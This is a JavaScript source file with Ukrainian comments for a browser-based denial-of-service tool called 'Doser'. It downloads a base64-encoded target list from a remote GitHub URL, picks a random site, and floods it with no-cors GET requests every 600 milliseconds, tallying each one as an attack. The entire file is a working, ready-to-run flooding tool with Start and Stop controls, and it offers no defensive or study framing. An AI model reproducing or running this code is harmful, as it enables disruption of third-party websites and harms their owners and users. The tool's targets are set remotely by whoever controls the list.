/*!
MIT License

Copyright (c) 2022 Yuriy Bogdan
<>
*/

// @ts-nocheck

/**
 * Інструменти
 */
const Tools = {
	/**
	 * Зберігання данних про атаки
	 */
	addCount() {
		$('#attacks').text(+$('#attacks').text() + 1);
		++Database.attacks;
	},

	/**
	 * Показ цілі користувачу
	 *
	 * @param {Target} target
	 */
	setTarget(target) {
		$('#target').text(target.page);
		$('#method').text(target.method);
	},

	/**
	 * Завантажувач цілей
	 *
	 * @returns {Promise<Target>} Рандомна ціль
	 * @throws {Error} Помилка завантаження
	 */
	async getTargets() {
		return await fetch(Doser.targetSource, { cache: 'no-cache' }).then(
			async function (response) {
				console.log(response);
				response = await response.text();

				const encodedData = atob(response);

				const data = JSON.parse(encodedData);

				/** @type Target[] */
				let targets = [];

				// Фільтрування цілей
				for (let i in data) {
					if (['post', 'get'].includes(data[i].method)) {
						targets.push(data[i]);
					}
				}
				$('#load').remove();

				return randomChoice(targets); // Рандомна ціль
			},
			(e) => console.error('Помилка завантаженя! ', e)
		);
	},
};

/**
 * Воркер
 */
class Doser {
	/**
	 * Конструктор досера
	 *
	 * TODO: Доробити SFX
	 *
	 * @constructor
	 */
	constructor() {
		/** Стан атаки */
		this.attack = false;
		/** Інтервал для `fetch` атаки */
		this.attackInterval = 600;
		this.targetSource =
			'https://raw.githubusercontent.com/xzyallzjx-231/iouzjla-612/main/40.json';
	}

	go() {
		this.attack ? this.stop() : this.start();
	}

	/**
	 * Запуск атаки
	 */
	async start() {
		if (!this.attack) {
			this.attack = true;
			$('#button').text('Стоп');

			// Завантаження цілей
			this.target = await Tools.getTargets();

			console.log(this.target);

			// Якщо цілі не завантажились
			if (!this.target) {
				// Якщо не завнтажились цілі

				swal(
					'Помилка!',
					'Перевірте підключення до інтернету!',
					'error'
				);

				this.attack = false;
				$('#button').text('Старт!');
				return; // Стоп
			}

			// Показ цілей
			Tools.setTarget(this.target);
			console.log(this.target);

			// Старт атаки

			// TODO: ЗРОБИТИ РЕКУРСИВНИЙ TIMEOUT!
			let attack = async () => {
				await fetch(this.target.page, {
					method: 'GET',
					mode: 'no-cors',
					referrerPolicy: 'no-referrer',
					cache: 'no-cache',
				}).then(
					() => Tools.addCount(),
					() => Tools.addCount()
				);
			};

			this.interval = setInterval(attack, this.attackInterval);
		}
	}

	/**
	 * Зупинка атаки
	 */
	stop() {
		if (this.interval && this.attack) {
			this.attack = false;
			clearInterval(this.interval);
			console.clear();
			$('#button').text('Старт!');
		}
	}
}
